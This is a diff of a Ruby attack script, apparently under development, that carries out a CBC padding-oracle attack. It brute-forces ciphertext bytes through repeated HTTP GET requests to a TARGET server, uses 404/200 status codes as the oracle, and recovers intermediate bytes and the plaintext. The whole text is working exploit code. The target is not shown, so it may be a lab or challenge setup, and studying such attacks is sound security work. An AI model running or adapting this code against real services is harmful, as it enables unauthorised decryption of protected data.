@@ -25,31 +25,31 @@ module Attack
 		class << self
 			def query(params)
 				@params = params	
+				@plaintext = ''
 
 				@blocks = split_parms(params)
 				@intermediate = []
-				@blocks.length.times do |progress|
+				(@blocks.length - 1).times do |progress|
 					intermediate_block = Array.new(16, "00")
 					(1..BLOCKSIZE).each do |i|
-						working_block = chunk(second_last_block(@blocks, progress), 2)
+						working_block = chunk(second_last_block(@blocks, (progress)), 2)
 						byte_in_progress = BLOCKSIZE - i
-						i.times {|count| working_block[BLOCKSIZE - (count + 1)] = (i.to_s.fix^intermediate_block[BLOCKSIZE - (count + 1)].fix).fix }
+						i.times {|count| working_block[BLOCKSIZE - (count + 1)] = (i.to_s(16).fix^intermediate_block[BLOCKSIZE - (count + 1)].fix).fix }
 						(0..255).each do |b|
 							working_block[byte_in_progress] = b.to_s(16).fix
-							response = call(working_block, progress)
-							if response.code == 404
+							response = call(working_block, (progress))
+							if ((response.code == 200) && (i>1)) || (response.code == 404)
 								intermediate_byte = (working_block[byte_in_progress]^i.to_s(16).fix).fix
 								intermediate_block[byte_in_progress] = intermediate_byte
 								puts intermediate_byte
+								puts i
 								break
-							elsif response.code == 200
-								puts "ERRRROROROROROROOR"
-								binding.pry
 							end
-						end	
+						end
 					end
-					@intermediate[progress + 1] = intermediate_block.join
+				@plaintext <<  [@blocks[progress]^intermediate_block.join].pack("H*")
 				end
+				puts @plaintext
 				binding.pry
 			end
 
@@ -57,7 +57,6 @@ module Attack
 				#puts block.join
 				modified = @blocks[0..(progress + 1)]
 				modified[progress] = block.join
-				puts modified.join
 				HTTParty.get(TARGET + modified.join)
 			end
 
